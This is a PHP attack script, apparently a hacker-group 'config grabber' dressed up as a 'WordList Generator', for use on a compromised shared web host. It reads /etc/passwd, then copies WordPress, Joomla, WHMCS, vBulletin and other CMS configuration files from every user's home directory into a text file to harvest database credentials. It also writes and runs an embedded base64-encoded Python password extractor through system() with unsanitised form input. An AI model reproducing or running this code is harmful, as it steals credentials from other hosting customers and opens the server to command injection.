

<?php

error_reporting(0);


	echo '<!DOCTYPE html>
<html>
<head>
	<title>WordList Generator</title>
</head>
<body>
<center>

	<h1 style="text-shadow: black 0px 0px 4px">~ WordList Generator ~</h1>
	<h2 style="text-shadow: black 0px 0px 4px">~ Coded By Injector(PCA)~ </h2>
	<img src="http://www5.0zz0.com/2016/02/10/16/902112525.jpg" width="300" height="400">

</body>
</html>';

	$users = file("/etc/passwd");
	$lolx = array();

		foreach ($users as $user) {

			$users = explode(":", $user);
			$lolx[] = $users[0];

		} 

		foreach ($lolx as $lol) { 


			
			if(file_exists('/home/'.$lol.'/public_html/inc/config.php')){

				$content1 = file_get_contents('/home/'.$lol.'/public_html/inc/config.php');

					$handle = fopen('fileContent.txt', 'a');
					fwrite($handle, $content."\n\n\n");
					fclose($handle);

			} elseif (file_exists('/home/'.$lol.'/public_html/sites/default/settings.php')) {
				
				$content2 = file_get_contents('/home/'.$lol.'/public_html/sites/default/settings.php');

					$handle = fopen('fileContent.txt', 'a');
					fwrite($handle, $content2."\n\n\n");
					fclose($handle);

			} elseif (file_exists('/home/'.$lol.'/public_html/includes/configure.php')) {
				
				$content3 = file_get_contents('/home/'.$lol.'/public_html/includes/configure.php');

					$handle = fopen('fileContent.txt', 'a');
					fwrite($handle, $content3."\n\n\n");
					fclose($handle);
			
			} elseif (file_exists('/home/'.$lol.'/public_html/lib/config.php')) {
				
				$content4 = file_get_contents('/home/'.$lol.'/public_html/lib/config.php');

					$handle = fopen('fileContent.txt', 'a');
					fwrite($handle, $content4."\n\n\n");
					fclose($handle);

			} elseif (file_exists('/home/'.$lol.'/public_html/config/koneksi.php')) {
				
				$content5 = file_get_contents('/home/'.$lol.'/public_html/config/koneksi.php');

					$handle = fopen('fileContent.txt', 'a');
					fwrite($handle, $content5."\n\n\n");
					fclose($handle);

			} elseif (file_exists('/home/'.$lol.'/public_html/vb/includes/config.php')) {
				
				$content6 = file_get_contents('/home/'.$lol.'/public_html/vb/includes/config.php');

					$handle = fopen('fileContent.txt', 'a');
					fwrite($handle, $content6."\n\n\n");
					fclose($handle);

			} elseif (file_exists('/home/'.$lol.'/public_html/includes/config.php')) {
				
				$content7 = file_get_contents('/home/'.$lol.'/public_html/includes/config.php');

					$handle = fopen('fileContent.txt', 'a');
					fwrite($handle, $content7."\n\n\n");
					fclose($handle);

			} elseif (file_exists('/home/'.$lol.'/public_html/forum/includes/config.php')) {
				
				$content8 = file_get_contents('/home/'.$lol.'/public_html/forum/includes/config.php');

					$handle = fopen('fileContent.txt', 'a');
					fwrite($handle, $content8."\n\n\n");
					fclose($handle);

			} elseif (file_exists('/home/'.$lol.'/public_html/cc/includes/config.php')) {
				
				$content9 = file_get_contents('/home/'.$lol.'/public_html/cc/includes/config.php');

					$handle = fopen('fileContent.txt', 'a');
					fwrite($handle, $content9."\n\n\n");
					fclose($handle);

			} elseif (file_exists('/home/'.$lol.'/public_html/config.php')) {
				
				$content10 = file_get_contents('/home/'.$lol.'/public_html/config.php');

					$handle = fopen('fileContent.txt', 'a');
					fwrite($handle, $content10."\n\n\n");
					fclose($handle);

			} elseif (file_exists('/home/'.$lol.'/public_html/forum/includes/config.php')) {
				
				$content11 = file_get_contents('/home/'.$lol.'/public_html/forum/includes/config.php');

					$handle = fopen('fileContent.txt', 'a');
					fwrite($handle, $content11."\n\n\n");
					fclose($handle);

			} elseif (file_exists('/home/'.$lol.'/public_html/wp-config.php')) {
				
				$content12 = file_get_contents('/home/'.$lol.'/public_html/wp-config.php');

					$handle = fopen('fileContent.txt', 'a');
					fwrite($handle, $content12."\n\n\n");
					fclose($handle);

					////////////////////////////////////////////////////////////////

			} elseif (file_exists('/home/'.$lol.'/public_html/blog/wp-config.php')) {
				
				$content13 = file_get_contents('/home/'.$lol.'/public_html/blog/wp-config.php');

					$handle = fopen('fileContent.txt', 'a');
					fwrite($handle, $content13."\n\n\n");
					fclose($handle);

			} elseif (file_exists('/home/'.$lol.'/public_html/wp/wp-config.php')) {
				
				$content14 = file_get_contents('/home/'.$lol.'/public_html/wp/wp-config.php');

					$handle = fopen('fileContent.txt', 'a');
					fwrite($handle, $content14."\n\n\n");
					fclose($handle);

			} elseif (file_exists('/home/'.$lol.'/public_html/home/wp-config.php')) {
				
				$content15 = file_get_contents('/home/'.$lol.'/public_html/home/wp-config.php');

					$handle = fopen('fileContent.txt', 'a');
					fwrite($handle, $content15."\n\n\n");
					fclose($handle);

			} elseif (file_exists('/home/'.$lol.'/public_html/wp-config.php')) {
				
				$content16 = file_get_contents('/home/'.$lol.'/public_html/wp-config.php');

					$handle = fopen('fileContent.txt', 'a');
					fwrite($handle, $content16."\n\n\n");
					fclose($handle);

			} elseif (file_exists('/home/'.$lol.'/public_html/main/wp-config.php')) {
				
				$content17 = file_get_contents('/home/'.$lol.'/public_html/main/wp-config.php');

					$handle = fopen('fileContent.txt', 'a');
					fwrite($handle, $content17."\n\n\n");
					fclose($handle);

			} elseif (file_exists('/home/'.$lol.'/public_html/site/wp-config.php')) {
				
				$content18 = file_get_contents('/home/'.$lol.'/public_html/site/wp-config.php');

					$handle = fopen('fileContent.txt', 'a');
					fwrite($handle, $content18."\n\n\n");
					fclose($handle);

			} elseif (file_exists('/home/'.$lol.'/public_html/configuration.php')) {
				
				$content19 = file_get_contents('/home/'.$lol.'/public_html/configuration.php');

					$handle = fopen('fileContent.txt', 'a');
					fwrite($handle, $content19."\n\n\n");
					fclose($handle);

			} elseif (file_exists('/home/'.$lol.'/public_html/blog/configuration.php')) {
				
				$content20 = file_get_contents('/home/'.$lol.'/public_html/blog/configuration.php');

					$handle = fopen('fileContent.txt', 'a');
					fwrite($handle, $content20."\n\n\n");
					fclose($handle);

			} elseif (file_exists('/home/'.$lol.'/public_html/joomla/configuration.php')) {
				
				$content21 = file_get_contents('/home/'.$lol.'/public_html/joomla/configuration.php');

					$handle = fopen('fileContent.txt', 'a');
					fwrite($handle, $content21."\n\n\n");
					fclose($handle);

			} elseif (file_exists('/home/'.$lol.'/public_html/main/configuration.php')) {
				
				$content22 = file_get_contents('/home/'.$lol.'/public_html/main/configuration.php');

					$handle = fopen('fileContent.txt', 'a');
					fwrite($handle, $content22."\n\n\n");
					fclose($handle);

			} elseif (file_exists('/home/'.$lol.'/public_html/home/configuration.php')) {
				
				$content23 = file_get_contents('/home/'.$lol.'/public_html/home/configuration.php');

					$handle = fopen('fileContent.txt', 'a');
					fwrite($handle, $content23."\n\n\n");
					fclose($handle);

			} elseif (file_exists('/home/'.$lol.'/public_html/site/configuration.php')) {
				
				$content24 = file_get_contents('/home/'.$lol.'/public_html/site/configuration.php');

					$handle = fopen('fileContent.txt', 'a');
					fwrite($handle, $content24."\n\n\n");
					fclose($handle);

			} elseif (file_exists('/home/'.$lol.'/public_html/whm/configuration.php')) {
				
				$content25 = file_get_contents('/home/'.$lol.'/public_html/whm/configuration.php');

					$handle = fopen('fileContent.txt', 'a');
					fwrite($handle, $content25."\n\n\n");
					fclose($handle);

			} elseif (file_exists('/home/'.$lol.'/public_html/whmc/configuration.php')) {
				
				$content26 = file_get_contents('/home/'.$lol.'/public_html/whmc/configuration.php');

					$handle = fopen('fileContent.txt', 'a');
					fwrite($handle, $content26."\n\n\n");
					fclose($handle);

			} elseif (file_exists('/home/'.$lol.'/public_html/support/configuration.php')) {
				
				$content27 = file_get_contents('/home/'.$lol.'/public_html/support/configuration.php');

					$handle = fopen('fileContent.txt', 'a');
					fwrite($handle, $content27."\n\n\n");
					fclose($handle);

			} elseif (file_exists('/home/'.$lol.'/public_html/client/configuration.php')) {
				
				$content28 = file_get_contents('/home/'.$lol.'/public_html/client/configuration.php');

					$handle = fopen('fileContent.txt', 'a');
					fwrite($handle, $content28."\n\n\n");
					fclose($handle);

			} elseif (file_exists('/home/'.$lol.'/public_html/billings/configuration.php')) {
				
				$content29 = file_get_contents('/home/'.$lol.'/public_html/billings/configuration.php');

					$handle = fopen('fileContent.txt', 'a');
					fwrite($handle, $content29."\n\n\n");
					fclose($handle);

			} elseif (file_exists('/home/'.$lol.'/public_html/billing/configuration.php')) {
				
				$content30 = file_get_contents('/home/'.$lol.'/public_html/billing/configuration.php');

					$handle = fopen('fileContent.txt', 'a');
					fwrite($handle, $content30."\n\n\n");
					fclose($handle);

			} elseif (file_exists('/home/'.$lol.'/public_html/clients/configuration.php')) {
				
				$content31 = file_get_contents('/home/'.$lol.'/public_html/clients/configuration.php');

					$handle = fopen('fileContent.txt', 'a');
					fwrite($handle, $content32."\n\n\n");
					fclose($handle);

			} elseif (file_exists('/home/'.$lol.'/public_html/whmcs/configuration.php')) {
				
				$content32 = file_get_contents('/home/'.$lol.'/public_html/whmcs/configuration.php');

					$handle = fopen('fileContent.txt', 'a');
					fwrite($handle, $content32."\n\n\n");
					fclose($handle);

			} elseif (file_exists('/home/'.$lol.'/public_html/order/configuration.php')) {
				
				$content33 = file_get_contents('/home/'.$lol.'/public_html/order/configuration.php');

					$handle = fopen('fileContent.txt', 'a');
					fwrite($handle, $content33."\n\n\n");
					fclose($handle);

			} elseif (file_exists('/home/'.$lol.'/public_html/admin/conf.php')) {
				
				$content34 = file_get_contents('/home/'.$lol.'/public_html/admin/conf.php');

					$handle = fopen('fileContent.txt', 'a');
					fwrite($handle, $content34."\n\n\n");
					fclose($handle);

			} elseif (file_exists('/home/'.$lol.'/public_html/admin/config.php')) {
				
				$content35 = file_get_contents('/home/'.$lol.'/public_html/admin/config.php');

					$handle = fopen('fileContent.txt', 'a');
					fwrite($handle, $content35."\n\n\n");
					fclose($handle);

			} elseif (file_exists('/home/'.$lol.'/public_html/conf_global.php')) {
				
				$content36 = file_get_contents('/home/'.$lol.'/public_html/conf_global.php');

					$handle = fopen('fileContent.txt', 'a');
					fwrite($handle, $content36."\n\n\n");
					fclose($handle);

			} elseif (file_exists('/home/'.$lol.'/public_html/include/db.php')) {
				
				$content37 = file_get_contents('/home/'.$lol.'/public_html/include/db.php');

					$handle = fopen('fileContent.txt', 'a');
					fwrite($handle, $content37."\n\n\n");
					fclose($handle);

			} elseif (file_exists('/home/'.$lol.'/public_html/connect.php')) {
				
				$content38 = file_get_contents('/home/'.$lol.'/public_html/connect.php');

					$handle = fopen('fileContent.txt', 'a');
					fwrite($handle, $content38."\n\n\n");
					fclose($handle);

			} elseif (file_exists('/home/'.$lol.'/public_html/mk_conf.php')) {
				
				$content39 = file_get_contents('/home/'.$lol.'/public_html/mk_conf.php');

					$handle = fopen('fileContent.txt', 'a');
					fwrite($handle, $content39."\n\n\n");
					fclose($handle);

			} elseif (file_exists('/home/'.$lol.'/public_html/include/config.php')) {
				
				$content40 = file_get_contents('/home/'.$lol.'/public_html/include/config.php');

					$handle = fopen('fileContent.txt', 'a');
					fwrite($handle, $content40."\n\n\n");
					fclose($handle);

			} elseif (file_exists('/home/'.$lol.'/public_html/settings.php')) {
				
				$content41 = file_get_contents('/home/'.$lol.'/public_html/settings.php');

					$handle = fopen('fileContent.txt', 'a');
					fwrite($handle, $content41."\n\n\n");
					fclose($handle);

			} elseif (file_exists('/home/'.$lol.'/public_html/includes/functions.php')) {
				
				$content42 = file_get_contents('/home/'.$lol.'/public_html/includes/functions.php');

					$handle = fopen('fileContent.txt', 'a');
					fwrite($handle, $content42."\n\n\n");
					fclose($handle);

			} elseif (file_exists('/home/'.$lol.'/public_html/include/db.php')) {
				
				$content11 = file_get_contents('/home/'.$lol.'/public_html/include/db.php');

					$handle = fopen('fileContent.txt', 'a');
					fwrite($handle, $content11."\n\n\n");
					fclose($handle);

			}

	}		

		

if(isset($_POST['url'])){

		$URL = $_POST['url'];
	
		$cp = 'IyEvdXNyL2Jpbi9lbnYgcHl0aG9uDQoNCicnJw0KQnk6IEFobWVkIFNoYXdreSBha2EgbG54ZzMzaw0KdGh4OiBPYnp5LCBSZWxpaywgbW9oYWIgYW5kICNhcmFicHduIA0KJycnDQoNCmltcG9ydCBzeXMNCmltcG9ydCBvcw0KaW1wb3J0IHJlDQppbXBvcnQgc3VicHJvY2Vzcw0KaW1wb3J0IHVybGxpYg0KaW1wb3J0IGdsb2INCmZyb20gcGxhdGZvcm0gaW1wb3J0IHN5c3RlbQ0KDQppZiBsZW4oc3lzLmFyZ3YpICE9IDM6DQogIHByaW50JycnCQ0KIFVzYWdlOiAlcyBbVVJMLi4uXSBbZGlyZWN0b3J5Li4uXQ0KIEV4KSAlcyBodHRwOi8vd3d3LnRlc3QuY29tL3Rlc3QvIFtkaXIgLi4uXScnJyAlIChzeXMuYXJndlswXSwgc3lzLmFyZ3ZbMF0pDQogIHN5cy5leGl0KDEpDQoNCnNpdGUgPSBzeXMuYXJndlsxXQ0KZm91dCA9IHN5cy5hcmd2WzJdDQoNCnRyeToNCiAgcmVxICA9IHVybGxpYi51cmxvcGVuKHNpdGUpDQogIHJlYWQgPSByZXEucmVhZCgpDQogIGlmIHN5c3RlbSgpID09ICdMaW51eCc6DQogICAgZiA9IG9wZW4oJy90bXAvZGF0YS50eHQnLCAndycpDQogICAgZi53cml0ZShyZWFkKQ0KICAgIGYuY2xvc2UoKQ0KICBpZiBzeXN0ZW0oKSA9PSAnV2luZG93cyc6DQogICAgZiA9IG9wZW4oJ2RhdGEudHh0JywgJ3cnKSAgDQogICAgZi53cml0ZShyZWFkKQ0KICAgIGYuY2xvc2UoKQ0KDQogIGkgPSAwDQogIGlmIHN5c3RlbSgpID09ICdMaW51eCc6DQogICAgZiA9IG9wZW4oJy90bXAvZGF0YS50eHQnLCAnclUnKQ0KICAgIGZvciBsaW5lIGluIGY6DQogICAgICBpZiBsaW5lLnN0YXJ0c3dpdGgoJzxsaT48YScpID09IFRydWUgOg0KICAgICAgICBtID0gcmUuc2VhcmNoKHInKDxhIGhyZWY9IikoLitbXj5dKSgiPiknLCBsaW5lKQ0KICAgICAgICBpICs9IDENCiAgICAgICAgbG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQ0KICAgICAgICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbS5ncm91cCgyKQ0KICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmlldmUoc2l0ZSArIG0uZ3JvdXAoMiksIGxvY2FsX25hbWUpDQogICAgICAgIGV4Y2VwdCBJT0Vycm9yOg0KICAgICAgICAgIHByaW50ICdcblslc10gZG9lc25cJ3QgZXhpc3QsIGNyZWF0ZSBpdCBmaXJzdCcgJSBmb3V0DQogICAgICAgICAgc3lzLmV4aXQoKQ0KICAgICAgaWYgbGluZS5zdGFydHN3aXRoKCc8aW1nJykgPT0gVHJ1ZToNCiAgICAgICAgbTEgPSByZS5zZWFyY2gocicoPGEgaHJlZj0iKSguK1tePl0pKCI+KScsIGxpbmUpDQogICAgICAgIGkgKz0gMQ0KICAgICAgICBsb2NhbF9uYW1lID0gJyVzL2ZpbGUlZC50eHQnICUgKGZvdXQsIGkpDQogICAgICAgIHByaW50ICdSZXRyaWV2aW5nLi4uXHRcdCcsIHNpdGUgKyBtMS5ncm91cCgyKQ0KICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmlldmUoc2l0ZSArIG0xLmdyb3VwKDIpLCBsb2NhbF9uYW1lKQ0KICAgICAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAgICAgICBwcmludCAnXG5bJXNdIGRvZXNuXCd0IGV4aXN0LCBjcmVhdGUgaXQgZmlyc3QnICUgZm91dA0KICAgICAgICAgIHN5cy5leGl0KCkNCiAgICAgIGlmIGxpbmUuc3RhcnRzd2l0aCgnPElNRycpID09IFRydWU6DQogICAgICAgIG0yID0gcmUuc2VhcmNoKHInKDxBIEhSRUY9IikoLitbXj5dKSgiPiknLCBsaW5lKQ0KICAgICAgICBpICs9IDENCiAgICAgICAgbG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQ0KICAgICAgICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbTIuZ3JvdXAoMikNCiAgICAgICAgdHJ5OiAgdXJsbGliLnVybHJldHJpZXZlKHNpdGUgKyBtMi5ncm91cCgyKSwgbG9jYWxfbmFtZSkNCiAgICAgICAgZXhjZXB0IElPRXJyb3I6DQogICAgICAgICAgcHJpbnQgJ1xuWyVzXSBkb2VzblwndCBleGlzdCwgY3JlYXRlIGl0IGZpcnN0JyAlIGZvdXQNCiAgICAgICAgICBzeXMuZXhpdCgpDQogICAgZi5jbG9zZSgpDQogIGlmIHN5c3RlbSgpID09ICdXaW5kb3dzJzoNCiAgICBmID0gb3BlbignZGF0YS50eHQnLCAnclUnKQ0KICAgIGZvciBsaW5lIGluIGY6DQogICAgICBpZiBsaW5lLnN0YXJ0c3dpdGgoJzxsaT48YScpID09IFRydWUgOg0KICAgICAgICBtID0gcmUuc2VhcmNoKHInKDxhIGhyZWY9IikoLitbXj5dKSgiPiknLCBsaW5lKQ0KICAgICAgICBpICs9IDENCiAgICAgICAgbG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQ0KICAgICAgICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbS5ncm91cCgyKQ0KICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmlldmUoc2l0ZSArIG0uZ3JvdXAoMiksIGxvY2FsX25hbWUpDQogICAgICAgIGV4Y2VwdCBJT0Vycm9yOg0KICAgICAgICAgIHByaW50ICdcblslc10gZG9lc25cJ3QgZXhpc3QsIGNyZWF0ZSBpdCBmaXJzdCcgJSBmb3V0DQogICAgICAgICAgc3lzLmV4aXQoKQ0KICAgICAgaWYgbGluZS5zdGFydHN3aXRoKCc8aW1nJykgPT0gVHJ1ZToNCiAgICAgICAgbTEgPSByZS5zZWFyY2gocicoPGEgaHJlZj0iKSguK1tePl0pKCI+KScsIGxpbmUpDQogICAgICAgIGkgKz0gMQ0KICAgICAgICBsb2NhbF9uYW1lID0gJyVzL2ZpbGUlZC50eHQnICUgKGZvdXQsIGkpDQogICAgICAgIHByaW50ICdSZXRyaWV2aW5nLi4uXHRcdCcsIHNpdGUgKyBtMS5ncm91cCgyKQ0KICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmlldmUoc2l0ZSArIG0xLmdyb3VwKDIpLCBsb2NhbF9uYW1lKQ0KICAgICAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAgICAgICBwcmludCAnXG5bJXNdIGRvZXNuXCd0IGV4aXN0LCBjcmVhdGUgaXQgZmlyc3QnICUgZm91dA0KICAgICAgICAgIHN5cy5leGl0KCkNCiAgICAgIGlmIGxpbmUuc3RhcnRzd2l0aCgnPElNRycpID09IFRydWU6DQogICAgICAgIG0yID0gcmUuc2VhcmNoKHInKDxBIEhSRUY9IikoLitbXj5dKSgiPiknLCBsaW5lKQ0KICAgICAgICBpICs9IDENCiAgICAgICAgbG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQ0KICAgICAgICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbTIuZ3JvdXAoMikNCiAgICAgICAgdHJ5OiAgdXJsbGliLnVybHJldHJpZXZlKHNpdGUgKyBtMi5ncm91cCgyKSwgbG9jYWxfbmFtZSkNCiAgICAgICAgZXhjZXB0IElPRXJyb3I6DQogICAgICAgICAgcHJpbnQgJ1xuWyVzXSBkb2VzblwndCBleGlzdCwgY3JlYXRlIGl0IGZpcnN0JyAlIGZvdXQNCiAgICAgICAgICBzeXMuZXhpdCgpDQogICAgZi5jbG9zZSgpDQogIGlmIHN5c3RlbSgpID09ICdMaW51eCc6DQogICAgY2xlYW51cCA9IHN1YnByb2Nlc3MuUG9wZW4oJ3JtIC1yZiAvdG1wL2RhdGEudHh0ID4gL2Rldi9udWxsJywgc2hlbGw9VHJ1ZSkud2FpdCgpDQogIGlmIHN5c3RlbSgpID09ICdXaW5kb3dzJzoNCiAgICBjbGVhbnVwID0gc3VicHJvY2Vzcy5Qb3BlbignZGVsIEM6XGRhdGEudHh0Jywgc2hlbGw9VHJ1ZSkud2FpdCgpDQogIHByaW50ICdcbicsICctJyAqIDEwMCwgJ1xuJw0KICBpZiBzeXN0ZW0oKSA9PSAnTGludXgnOg0KICAgIGZvciByb290LCBkaXJzLCBmaWxlcyBpbiBvcy53YWxrKGZvdXQpOg0KICAgICAgZm9yIGZuYW1lIGluIGZpbGVzOg0KICAgICAgICBmdWxscGF0aCA9IG9zLnBhdGguam9pbihyb290LCBmbmFtZSkNCiAgICAgICAgZiA9IG9wZW4oZnVsbHBhdGgsICdyJykNCiAgICAgICAgZm9yIGxpbmUgaW4gZjoNCiAgICAgICAgICBzZWNyID0gcmUuc2VhcmNoIChyIihkYl9wYXNzd29yZCddID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQ0KICAgICAgICAgIGlmIHNlY3IgaXMgbm90IE5vbmU6IHByaW50IChzZWNyLmdyb3VwKDIpKSAgDQogICAgICAgICAgc2VjcjEgPSByZS5zZWFyY2gociIocGFzc3dvcmQgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgICAgaWYgc2VjcjEgaXMgbm90IE5vbmU6ICBwcmludCAgKHNlY3IxLmdyb3VwKDIpKQ0KICAgICAgICAgIHNlY3IyID0gcmUuc2VhcmNoKHIiKERCX1BBU1NXT1JEJykoLi4uKSguK1tePl0pKCcpIiwgbGluZSkNCiAgICAgICAgICBpZiBzZWNyMiBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3IyLmdyb3VwKDMpKQ0KICAgICAgICAgIHNlY3IzID0gcmUuc2VhcmNoIChyIihkYnBhc3MgPS4uKSguK1tePl0pKC47KSIsIGxpbmUpDQogICAgICAgICAgaWYgc2VjcjMgaXMgbm90IE5vbmU6IHByaW50IChzZWNyMy5ncm91cCgyKSkNCiAgICAgICAgICBzZWNyNCA9IHJlLnNlYXJjaCAociIoREJQQVNTV09SRCA9ICcpKC4rW14+XSkoLjspIiwgbGluZSkNCiAgICAgICAgICBpZiBzZWNyNCBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3I0Lmdyb3VwKDIpKQ0KICAgICAgICAgIHNlY3I1ID0gcmUuc2VhcmNoIChyIihEQnBhc3MgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgICAgaWYgc2VjcjUgaXMgbm90IE5vbmU6IHByaW50IChzZWNyNS5ncm91cCgyKSkNCiAgICAgICAgICBzZWNyNiA9IHJlLnNlYXJjaCAociIoZGJwYXNzd2QgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgICAgaWYgc2VjcjYgaXMgbm90IE5vbmU6IHByaW50IChzZWNyNi5ncm91cCgyKSkNCiAgICAgICAgICBzZWNyNyA9IHJlLnNlYXJjaCAociIobW9zQ29uZmlnX3Bhc3N3b3JkID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQ0KICAgICAgICAgIGlmIHNlY3I3IGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjcuZ3JvdXAoMikpDQogICAgICAgIGYuY2xvc2UoKQ0KICBpZiBzeXN0ZW0oKSA9PSAnV2luZG93cyc6DQogICAgZm9yIGluZmlsZSBpbiBnbG9iLmdsb2IoIG9zLnBhdGguam9pbihmb3V0LCAnKi50eHQnKSApOg0KICAgICAgZiA9IG9wZW4oaW5maWxlLCAncicpDQogICAgICBmb3IgbGluZSBpbiBmOg0KICAgICAgICBzZWNyID0gcmUuc2VhcmNoIChyIihkYl9wYXNzd29yZCddID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQ0KICAgICAgICBpZiBzZWNyIGlzIG5vdCBOb25lOiBwcmludCAoc2Vjci5ncm91cCgyKSkgIA0KICAgICAgICBzZWNyMSA9IHJlLnNlYXJjaChyIihwYXNzd29yZCA9ICcpKC4rW14+XSkoJzspIiwgbGluZSkNCiAgICAgICAgaWYgc2VjcjEgaXMgbm90IE5vbmU6ICBwcmludCAgKHNlY3IxLmdyb3VwKDIpKQ0KICAgICAgICBzZWNyMiA9IHJlLnNlYXJjaChyIihEQl9QQVNTV09SRCcpKC4uLikoLitbXj5dKSgnKSIsIGxpbmUpDQogICAgICAgIGlmIHNlY3IyIGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjIuZ3JvdXAoMykpDQogICAgICAgIHNlY3IzID0gcmUuc2VhcmNoIChyIihkYnBhc3MgPS4uKSguK1tePl0pKC47KSIsIGxpbmUpDQogICAgICAgIGlmIHNlY3IzIGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjMuZ3JvdXAoMikpDQogICAgICAgIHNlY3I0ID0gcmUuc2VhcmNoIChyIihEQlBBU1NXT1JEID0gJykoLitbXj5dKSguOykiLCBsaW5lKQ0KICAgICAgICBpZiBzZWNyNCBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3I0Lmdyb3VwKDIpKQ0KICAgICAgICBzZWNyNSA9IHJlLnNlYXJjaCAociIoREJwYXNzID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQ0KICAgICAgICBpZiBzZWNyNSBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3I1Lmdyb3VwKDIpKQ0KICAgICAgICBzZWNyNiA9IHJlLnNlYXJjaCAociIoZGJwYXNzd2QgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgIGlmIHNlY3I2IGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjYuZ3JvdXAoMikpDQogICAgICAgIHNlY3I3ID0gcmUuc2VhcmNoIChyIihtb3NDb25maWdfcGFzc3dvcmQgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgIGlmIHNlY3I3IGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjcuZ3JvdXAoMikpDQogICAgICBmLmNsb3NlKCkNCmV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQpOg0KICBwcmludCAnXG5UaGFua3MgZm9yIHVzaW5nIGl0IC5fXic=';
			
		$file = fopen("cp.py","w+");
		$write = fwrite ($file ,base64_decode($cp));
		fclose($file);

		chmod("cp.py", 0755);

		echo"<center><textarea cols=\"90\" rows=\"20\" name=\"usernames\">";
		system("python cp.py $URL config");
		unlink ('cp.py');
		echo"</textarea>";
	 
} else {

	        echo '
				<br><center>
					<form method="POST">
						<input type="text" name="url" placeholder="Please Enter The Path!!">
						<input type="submit" value=">>">
					</form>
				</center>
		     ';

}

echo '<BR><BR>
<marquee style="text-shadow: black 0px 0px 3px">Injector(PCA) :: Bilal Khan :: Virus Site :: Amir Muzaffar :: Osama Xawanz :: Hex Look :: Hunter Gujjar :: Anas Ali :: Behroz Nathwani :: Faisal 1337 :: Kashif Khan</marquee>';

?>
